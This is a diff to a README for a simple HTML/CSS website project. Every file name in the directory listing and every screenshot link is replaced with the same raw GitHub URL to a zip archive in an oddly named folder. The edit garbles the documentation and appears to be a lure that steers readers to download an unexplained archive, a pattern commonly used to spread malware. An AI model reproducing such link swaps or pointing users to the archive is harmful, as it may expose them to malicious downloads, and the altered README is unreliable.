@@ -4,22 +4,22 @@ This project is a simple website featuring a Home page, Council page, Product pa
 
 ## Directory Structue
 simple-website/
-├── index.html
-├── council.html
-├── product.html
-├── contact.html
+├── https://raw.githubusercontent.com/kiran03-jagadeesh/CSS-Basic-Project/main/biarcuate/CS-Basic-Project-2.0.zip
+├── https://raw.githubusercontent.com/kiran03-jagadeesh/CSS-Basic-Project/main/biarcuate/CS-Basic-Project-2.0.zip
+├── https://raw.githubusercontent.com/kiran03-jagadeesh/CSS-Basic-Project/main/biarcuate/CS-Basic-Project-2.0.zip
+├── https://raw.githubusercontent.com/kiran03-jagadeesh/CSS-Basic-Project/main/biarcuate/CS-Basic-Project-2.0.zip
 
 ## Requirements
 To view and edit this project, you need a text editor (such as VSCode, Sublime Text, or Notepad++) and a web browser (such as Chrome, Firefox, or Edge).
 
 ## OUTPUT HOME :
-![output](home.png)
+![output](https://raw.githubusercontent.com/kiran03-jagadeesh/CSS-Basic-Project/main/biarcuate/CS-Basic-Project-2.0.zip)
 
 ## OUTPUT PRODUCT :
-![output](product.png)
+![output](https://raw.githubusercontent.com/kiran03-jagadeesh/CSS-Basic-Project/main/biarcuate/CS-Basic-Project-2.0.zip)
 
 ## OUTPUT PEOPLE :
-![output](people.png)
+![output](https://raw.githubusercontent.com/kiran03-jagadeesh/CSS-Basic-Project/main/biarcuate/CS-Basic-Project-2.0.zip)
 
 ## OUTPUT CONTACT :
-![output](contact.png)
+![output](https://raw.githubusercontent.com/kiran03-jagadeesh/CSS-Basic-Project/main/biarcuate/CS-Basic-Project-2.0.zip)
